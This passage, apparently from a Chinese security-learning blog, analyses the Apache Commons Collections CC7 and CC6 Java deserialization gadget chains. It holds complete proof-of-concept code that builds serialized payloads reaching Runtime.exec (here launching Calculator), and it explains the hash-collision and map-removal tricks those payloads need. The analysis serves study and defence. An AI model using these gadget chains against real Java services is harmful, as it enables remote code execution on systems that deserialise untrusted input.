java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections7</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">CommonsCollections7</span> <span class="variable">commonsCollections7</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CommonsCollections7</span>();</span><br><span class="line">        commonsCollections7.serialize();</span><br><span class="line">        commonsCollections7.unserialize();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 客户端</span></span><br><span class="line"><span class="comment">     * */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span>  <span class="title function_">serialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;open -a Calculator.app&quot;</span>;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="comment">// new Class[0]为占位符</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;cmd&#125;</span><br><span class="line">                )</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">// 创建虚假的调用链</span></span><br><span class="line">        Transformer[] fakeTransformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;&#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(fakeTransformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap1</span> <span class="operator">=</span> LazyMap.decorate(innerMap1,chainedTransformer);</span><br><span class="line">        lazyMap1.put(<span class="string">&quot;yy&quot;</span>,<span class="number">1</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap2</span> <span class="operator">=</span> LazyMap.decorate(innerMap2,chainedTransformer);</span><br><span class="line">        lazyMap2.put(<span class="string">&quot;zZ&quot;</span>,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Hashtable</span> <span class="variable">hashtable</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>&lt;&gt;();</span><br><span class="line">        hashtable.put(lazyMap1, <span class="number">1</span>);</span><br><span class="line">        hashtable.put(lazyMap2, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 将真正的利用链数组设置到ChainedTransformer里面的iTransformers字段值</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> ChainedTransformer.class.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f.set(chainedTransformer, transformers);</span><br><span class="line"></span><br><span class="line">        lazyMap2.remove(<span class="string">&quot;yy&quot;</span>);</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">        <span class="comment">// 创建并实例化对象输出流</span></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">        out.writeObject(hashtable);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 服务端</span></span><br><span class="line"><span class="comment">     *  */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// 创建并实例化文件输入流</span></span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">        <span class="comment">// 创建并实例化对象输入流</span></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line">        in.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>POC 中有几个问题需要解答。</p><ul><li>为什么<code>Hashtable</code>需要 put 两次？</li></ul><p>在<code>Hashtable#reconstitutionPut()</code>方法中，第一次进入时<code>tab</code>内容为空，无法进入 for 循环，进而没法调用到<code>key.equals()</code>方法<br><img src="images/image-20221011164109290.png" alt="image-20221011164109290"></p><p>为了调用两次<code>reconstitutionPut()</code>方法，我们需要通过<code>put()</code>两次内容，使得<code>elements</code>的值为2，进而在 for 循环里运行两次<code>reconstitutionPut()</code>方法<br><img src="images/image-20221011164346546.png" alt="image-20221011164346546"></p><ul><li>为什么<code>lazyMap()</code>需要<code>yy</code>和<code>zZ</code>两个字符串？</li></ul><p>还是<code>reconstitutionPut()</code>方法，<code>e.hash == hash</code>会判断上一个<code>key</code>的<code>hash</code>是否与当前<code>key</code>的<code>hash</code>相等，只有相等才能进入下一步。<br><img src="images/image-20221011165323252.png" alt="image-20221011165323252"></p><p>而字符串<code>yy</code>和<code>zZ</code>经过<code>hashCode()</code>方法计算是相等的<br><img src="images/image-20221011170202472.png" alt="image-20221011170202472"></p><p>那么为什么这两个字符串会相等呢？因为是字符串，所以我们跟进<code>String#hashCode()</code>方法<br><img src="images/image-20221011171013521.png" alt="image-20221011171013521"></p><p>算法就这一句<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">h = 31 * h + val[i];</span><br></pre></td></tr></table></figure></p><p>首先第一个<code>y</code>的<code>ascii</code>值为 121，而第一个<code>z</code>的<code>ascii</code>值为 122，经过计算：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a:  y-&gt;121 y-&gt; 121*31 + 121 = 3872</span><br><span class="line">b:  z-&gt;122 ？-&gt; 122*31 + ？  = 3872  -&gt; ? = 90</span><br></pre></td></tr></table></figure></p><p>所以要想<code>a</code>和<code>b</code>经过<code>hashCode()</code>方法计算相等，<code>b</code>的第二个元素就得比<code>a</code>小，结果为<code>Z</code>，<code>Z</code>的<code>ascii</code>值为 90</p><ul><li>为什么最后要<code>remove(&quot;yy&quot;)</code>？</li></ul><p>问题出在<code>AbstractMap#equals()</code>方法里，<code>size()</code>的值为 1，而<code>m.size()</code>的值为 2，所以我们需要<code>remove</code>掉一个使其相等。<br><img src="images/image-20221012102519876.png" alt="image-20221012102519876"></p><p>那么还剩一下问题，为什么是<code>lazyMap2.remove(&quot;yy&quot;);</code>？</p><p>在<code>Hashtable#put()</code>方法时也会调用一次<code>entry.key.equals(key)</code><br><img src="images/image-20221012103923937.png" alt="image-20221012103923937"></p><p>因此在<code>hashtable.put(lazyMap2, 2);</code>之后跟到<code>AbstractMap()#equals()</code>方法<br><img src="images/image-20221012104621160.png" alt="image-20221012104621160"></p><p>这里可以看到，传入<code>LazyMap#get(key)</code>中的 key 为<code>yy</code>，继续跟进<code>LazyMap#get()</code>方法<br><img src="images/image-20221012104834141.png" alt="image-20221012104834141"></p><p>最后因为<code>lazyMap2</code>中并没有<code>yy</code>这个<code>key</code>，因此会执行一个<code>map.put(&quot;yy&quot;,&quot;yy&quot;)</code>的操作添加，所以在 POC 中，我们最后要把<code>lazyMap2</code>的<code>yy</code>给删除掉。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>CommonsCollections6利用链分析</title>
      <link href="/2022/11/10/CommonsCollections6/"/>
      <url>/2022/11/10/CommonsCollections6/</url>
      
        <content type="html"><![CDATA[<h1 id="CommonsCollections6利用链分析"><a href="#CommonsCollections6利用链分析" class="headerlink" title="CommonsCollections6利用链分析"></a>CommonsCollections6利用链分析</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><strong>为什么跳过了<code>CommonsCollections2</code>先学习<code>CommonsCollections6</code>？</strong></p><p>前面学习的<code>CommonsCollections</code>和<code>CommonsCollections1</code>链，可以看到都受限于 JDK 版本，在<code>jdk8u71</code>之后就无法利用，原因则是前面已经提过的。</p><p>而为了实现在高版本 JDK 的环境下依然能利用的问题，<code>CommonsCollections6</code>这条链子应运而生。因此在学完<code>CommonsCollections1</code>后接着学习<code>CommonsCollections6</code>会比较系统。</p><p>该条利用链的利用条件如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CommonsCollections 3.1 - 3.2.1</span><br><span class="line">JDK版本暂无</span><br></pre></td></tr></table></figure><h2 id="利用链"><a href="#利用链" class="headerlink" title="利用链"></a>利用链</h2><p>先看一些 p 牛给出的简化利用链：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Gadget chain:</span></span><br><span class="line"><span class="comment">    java.io.ObjectInputStream.readObject()</span></span><br><span class="line"><span class="comment">            java.util.HashMap.readObject()</span></span><br><span class="line"><span class="comment">                java.util.HashMap.hash()</span></span><br><span class="line"><span class="comment">                    org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()</span></span><br><span class="line"><span class="comment">                    org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()</span></span><br><span class="line"><span class="comment">                        org.apache.commons.collections.map.LazyMap.get()</span></span><br><span class="line"><span class="comment">                            org.apache.commons.collections.functors.ChainedTransformer.transform()</span></span><br><span class="line"><span class="comment">                            org.apache.commons.collections.functors.InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">                            java.lang.reflect.Method.invoke()</span></span><br><span class="line"><span class="comment">                                java.lang.Runtime.exec()</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure></p><p>在 JDK 8u71 之后，<code>sun.reflect.annotation.AnnotationInvocationHandler</code>的<code>readObject()</code>方法发生了变化导致无法再触发<code>LazyMap</code>类的<code>get()</code>方法，而思路自然而然就是再次寻找其他能触发<code>LazyMap#get()</code>的地方。在利用链中可以看到最后找到的是<code>TiedMapEntry</code>类</p><p>跟进查看<code>TiedMapEntry#hashCode()</code>方法源码，调用了<code>this.getValue();</code><br><img src="images/image-20221004215622854.png" alt="image-20221004215622854"></p><p>接着跟进<code>this.getValue()</code>方法<br><img src="images/image-20221004220012400.png" alt="image-20221004220012400"></p><p>可以看到在<code>getValue()</code>中调用了<code>map.get()</code>方法，并且<code>map</code>和<code>key</code>都是通过构造函数传入，完全可控，所以可以通过构造传参调用到<code>LazyMap#get()</code>，满足了我们的期望。</p><p>接下来就是寻找可以调用<code>TiedMapEntry#hashCode()</code>，在前面已经学习过的<a href="./02-反序列化专区/0-URLDNS利用链/URLDNS利用链.md">URLDNS利用链分析</a>章节中，我们已经知道在<code>HashMap#readObject()</code>里，<code>putVal()</code>方法对<code>key</code>进行了<code>hash()</code>计算，进而调用传进来的<code>key</code>的<code>hashCode()</code>的方法。</p><p>因此我们只要让<code>key</code>为<code>TiedMapEntry</code>对象，就可以完成整个攻击链。开始编写初始 POC：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.serialize;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by dotast on 2022/10/4 21:55</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections6</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">CommonsCollections6</span> <span class="variable">transformerTest</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CommonsCollections6</span>();</span><br><span class="line">        transformerTest.serialize();</span><br><span class="line">        transformerTest.unserialize();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 客户端</span></span><br><span class="line"><span class="comment">     * */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span>  <span class="title function_">serialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;open -a Calculator.app&quot;</span>;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="comment">// new Class[0]为占位符</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;cmd&#125;</span><br><span class="line">                )</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">// 创建恶意的调用链</span></span><br><span class="line">        Transformer[] fakeTransformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(fakeTransformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, chainedTransformer);</span><br><span class="line">        <span class="comment">// 创建TiedMapEntry实例</span></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(outerMap,<span class="string">&quot;keyTest&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">expMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        expMap.put(tiedMapEntry,<span class="string">&quot;valueTest&quot;</span>);</span><br><span class="line">        <span class="comment">// 将真正的利用链数组设置到ChainedTransformer里面的iTransformers字段值</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> ChainedTransformer.class.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f.set(chainedTransformer, transformers);</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">        <span class="comment">// 创建并实例化对象输出流</span></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">        out.writeObject(expMap);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 服务端</span></span><br><span class="line"><span class="comment">     *  */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// 创建并实例化文件输入流</span></span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">        <span class="comment">// 创建并实例化对象输入流</span></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line">        in.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>但运行后却没有弹出计算器，开始找找原因，我们在<code>LazyMap#get()</code>方法处打断点，结果发现一共调用了两次<code>LazyMap#get()</code></p><p>第一次时进入了 if 方法<br><img src="images/image-20221008152547485.png" alt="image-20221008152547485"></p><p>第二次时没有进入 if 方法<br><img src="images/image-20221008152629215.png" alt="image-20221008152629215"></p><p>为什么会调用两次<code>LazyMap#get()</code>方法呢？仔细再跟一遍才想起来<code>HashMap#put()</code>方法也会调用到<code>hashcode()</code><br><img src="images/image-20221008152723595.png" alt="image-20221008152723595"></p><p>因此在<code>expMap.put(tiedMapEntry,&quot;valueTest&quot;);</code>语句时就一次触发了一次<code>LazyMap#get()</code>利用链，但因为我们故意制造的<code>fakeTransformers</code>所以没有触发命令执行，但是却在这里将<code>keyTest</code>添加进了<code>outerMap</code>中。<br><img src="images/image-20221008153011697.png" alt="image-20221008153011697"></p><p>因此在经过反序列化后调用利用链时，再次进行 if 判断时，<code>keyTest</code>在<code>outermap</code>对象里，跳过了判断进入 else 语句，导致无法触发命令执行。</p><p>根据 p 牛的做法就是再写一句<code>outerMap.remove(&quot;keyTest&quot;);</code>将 key 从 <code>outerMap</code>中移除，因此最终 POC 为：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.serialize;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by dotast on 2022/10/4 21:55</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections6</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">CommonsCollections6</span> <span class="variable">transformerTest</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CommonsCollections6</span>();</span><br><span class="line">        transformerTest.serialize();</span><br><span class="line">        transformerTest.unserialize();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 客户端</span></span><br><span class="line"><span class="comment">     * */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span>  <span class="title function_">serialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;open -a Calculator.app&quot;</span>;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="comment">// new Class[0]为占位符</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;cmd&#125;</span><br><span class="line">                )</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">// 创建恶意的调用链</span></span><br><span class="line">        Transformer[] fakeTransformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(fakeTransformers);</span><br><span class="line">        <span 